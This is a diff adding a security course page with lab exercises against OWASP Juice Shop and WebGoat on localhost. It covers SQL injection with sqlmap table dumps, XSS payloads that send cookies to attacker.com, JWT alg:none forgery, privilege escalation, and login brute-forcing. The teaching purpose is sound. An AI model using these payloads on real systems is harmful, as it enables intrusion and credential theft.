@@ -1,0 +1,260 @@
+---
+title: "Application Security Lab"
+description: "Hands-on exercises: OWASP Juice Shop exploitation, SQL injection with sqlmap, XSS payload crafting, JWT attacks, API security testing, and secure code review."
+sidebar:
+  order: 8
+  label: "Application Security Lab"
+tab: "cybersecurity"
+---
+
+This lab provides practical experience with application security testing. You will work through exercises targeting real vulnerabilities in a deliberately vulnerable application.
+
+## Setup
+
+```bash
+# Option 1: OWASP Juice Shop (local Docker)
+docker pull bkimminich/juice-shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+# Open http://localhost:3000
+
+# Option 2: OWASP WebGoat (local)
+docker pull webgoat/goatandwolf
+docker run -d -p 8080:8080 -p 9090:9090 webgoat/goatandwolf
+# Open http://localhost:8080/WebGoat
+
+# Install tools
+sudo apt install -y sqlmap nmap curl jq
+pip install requests flask flask-wtf
+npm install -g jwt-cli
+```
+
+## Exercise 1: Reconnaissance
+
+### Objective
+Discover the attack surface of the target application.
+
+```bash
+# 1. Enumerate endpoints
+curl -s http://localhost:3000/api/ | jq '.'
+
+# 2. Directory brute-forcing with common paths
+for path in admin api assets backup config debug docs graphql health login logout robots swagger test; do
+  status=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/$path")
+  echo "GET /$path → HTTP $status"
+done
+
+# 3. Check security headers
+curl -s -I http://localhost:3000 | grep -iE "x-frame|x-content|x-xss|strict|csp|hsts"
+
+# 4. Extract JavaScript files for endpoint discovery
+curl -s http://localhost:3000 | grep -oP 'src="[^"]+"' | sort -u
+```
+
+### Questions
+1. What endpoints did you discover?
+2. What security headers are missing?
+3. What information can you gather from JavaScript files?
+
+---
+
+## Exercise 2: SQL Injection
+
+### Objective
+Extract data from the database using SQL injection.
+
+```bash
+# 1. Test login form with SQL injection
+curl -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "' OR 1=1 --", "password": "anything"}'
+
+# 2. If that doesn't work, try these payloads
+# ' OR '1'='1
+# admin@test.com' --
+# ' UNION SELECT 1,2,3,4,5,6 --
+# '; WAITFOR DELAY '00:00:05' --
+# ' AND SLEEP(5) --
+
+# 3. Use sqlmap for automated exploitation
+sqlmap -u "http://localhost:3000/rest/products/search?q=test" --batch
+sqlmap -u "http://localhost:3000/rest/products/search?q=test" --dbs
+sqlmap -u "http://localhost:3000/rest/products/search?q=test" -D juice_shop --tables
+sqlmap -u "http://localhost:3000/rest/products/search?q=test" -D juice_shop -T Users --dump
+```
+
+### Deliverable
+1. Extracted user credentials (email + password hash)
+2. Password hash cracking attempt with hashcat
+3. SQLi payload that worked and why
+
+---
+
+## Exercise 3: Cross-Site Scripting (XSS)
+
+### Objective
+Inject and execute JavaScript payloads.
+
+```bash
+# 1. Test search field for reflected XSS
+curl "http://localhost:3000/?q=<script>alert(1)</script>"
+
+# 2. If blocked, try:
+# <img src=x onerror=alert(1)>
+# <svg onload=alert(1)>
+# "><script>alert(1)</script>
+# <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+
+# 3. Test comment/review form for stored XSS
+curl -X POST http://localhost:3000/api/Reviews \
+  -H "Content-Type: application/json" \
+  -d '{"productId": 1, "message": "<script>alert(document.cookie)</script>"}'
+
+# 4. Craft XSS payload that steals cookies
+cat > steal_cookie.js << 'JS'
+<script>
+  fetch('https://attacker.com/collect?cookie=' + document.cookie + 
+        '&page=' + encodeURIComponent(document.location.href))
+</script>
+JS
+```
+
+### Deliverable
+1. One working reflected XSS payload
+2. One working stored XSS payload  
+3. Explanation of why the payload executed (what encoding was missing)
+
+---
+
+## Exercise 4: JWT Attacks
+
+### Objective
+Exploit weaknesses in JWT authentication.
+
+```bash
+# 1. Log in and capture the JWT
+TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@test.com","password":"test123"}' | jq -r '.authentication.token')
+echo "Token: $TOKEN"
+
+# 2. Decode the JWT (Base64 decode)
+echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null
+echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null  # Header
+
+# 3. Check the algorithm
+echo $TOKEN | jwt decode -
+
+# 4. Try algorithm confusion attack (alg:none)
+python3 << 'PYEOF'
+import jwt
+
+# Try "none" algorithm
+payload = {"email": "admin@juice-sh.op", "iat": 1516239022}
+try:
+    token = jwt.encode(payload, key="", algorithm="none")
+    print(f"alg=none token: {token}")
+except:
+    print("alg=none attack blocked")
+PYEOF
+```
+
+### Deliverable
+1. Decoded JWT showing header, payload, and signature
+2. If vulnerable, forged admin token
+3. Analysis of JWT security measures
+
+---
+
+## Exercise 5: API Security Testing
+
+### Objective
+Find API vulnerabilities including BOLA, mass assignment, and excessive data exposure.
+
+```bash
+# 1. BOLA test — try to access another user's data
+curl -s http://localhost:3000/rest/user/2  # Try different user IDs
+curl -s http://localhost:3000/api/Orders/1?userId=2
+
+# 2. Mass assignment — try to escalate privileges
+curl -X PATCH http://localhost:3000/rest/user/1 \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"role": "admin"}'  # Try adding unexpected fields
+
+# 3. Excessive data exposure
+curl -s http://localhost:3000/rest/user/1 | jq '.'
+
+# 4. Rate limit testing
+for i in {1..100}; do
+  curl -s -o /dev/null -w "%{http_code}\n" \
+    -X POST http://localhost:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"test@test.com","password":"wrong'$i'"}'
+done | sort | uniq -c
+```
+
+### Deliverable
+1. BOLA vulnerability (accessing another user's data)
+2. Mass assignment vulnerability (if found)
+3. Rate limiting analysis (how many requests before blocking?)
+4. Excessive data exposure findings
+
+---
+
+## Exercise 6: Secure Code Review
+
+### Objective
+Identify vulnerabilities in source code.
+
+```bash
+# Clone Juice Shop source
+git clone https://github.com/juice-shop/juice-shop.git
+cd juice-shop
+
+# Search for common vulnerability patterns
+echo "=== SQLi patterns (string concatenation) ==="
+grep -rn "\\$\\{.*query" --include="*.ts" --include="*.js" | head -10
+
+echo ""
+echo "=== XSS patterns (innerHTML) ==="
+grep -rn "innerHTML" --include="*.ts" --include="*.js" | head -10
+
+echo ""
+echo "=== Hardcoded secrets ==="
+grep -rn "password" --include="*.ts" --include="*.js" -i | grep -v test | grep -v node_modules | head -20
+
+echo ""
+echo "=== Insecure crypto ==="
+grep -rn "MD5\|SHA1\|DES\|RC4" --include="*.ts" --include="*.js" | head -10
+```
+
+### Code Review Checklist
+
+```yaml
+Check each file for:
+  └─ SQL injection: String concatenation in database queries
+  └─ XSS: innerHTML, dangerouslySetInnerHTML, v-html
+  └─ Broken auth: Missing authentication check on endpoints
+  └─ Broken access control: No ownership verification
+  └─ Secrets: Hardcoded API keys, passwords, tokens
+  └─ Insecure crypto: Weak algorithms, static IVs
+  └─ Mass assignment: req.body directly to database
+  └─ Path traversal: User input in file paths
+```
+
+### Deliverable
+1. At least 5 vulnerabilities identified in code review
+2. For each: file, line number, vulnerability type, fix recommendation
+3. Pull request with fixes for the most critical issue
+
+---
+
+## Lab Completion Checklist
+
+- [ ] Exercise 1: Application recon complete (endpoints, headers, JS analysis)
+- [ ] Exercise 2: SQL injection working — data extracted and cracked
+- [ ] Exercise 3: Reflected and stored XSS working
+- [ ] Exercise 4: JWT decoded, alg:none attack tested
+- [ ] Exercise 5: API vulnerabilities documented (BOLA, mass assignment, rate limiting)
+- [ ] Exercise 6: Code review findings with fix recommendations
+- [ ] All results documented with payloads, commands, and screenshots
